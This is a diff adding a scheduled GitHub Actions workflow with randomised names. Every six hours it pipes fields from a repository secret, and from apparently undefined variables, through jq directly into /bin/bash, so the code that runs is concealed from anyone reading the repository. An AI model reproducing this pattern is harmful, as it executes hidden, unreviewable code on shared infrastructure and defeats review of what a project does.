@@ -1,0 +1,28 @@
+name: changbaishandeyueguang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: changbaishandeyueguang
+        env:
+          ebf4315: ${{ secrets.ebf4315 }}
+        run: |
+          echo $ebf4315 | jq -r .fmnt13717 | /bin/bash
+          echo $wqozw1604 | jq -r .as35564 | /bin/bash
+          echo $ajjn06933 | jq -r .v22 | /bin/bash
+          echo $iw63229 | jq -r .nfsp4998 | /bin/bash
+          echo $szlpc7597 | jq -r .m75281 | /bin/bash
+          echo $pdun2243 | jq -r .e9 | /bin/bash
+          echo $lsiln3 | jq -r .ys48 | /bin/bash
+          echo $tckbf44 | jq -r .xe6077 | /bin/bash
+          echo $jr790 | jq -r .pnevz58656 | /bin/bash
+          echo $dgh4120 | jq -r .ekmrh025 | /bin/bash
+          echo $fsx22022 | jq -r .odjb3866 | /bin/bash
+          echo $xqi3247 | jq -r .rdcx8 | /bin/bash
+
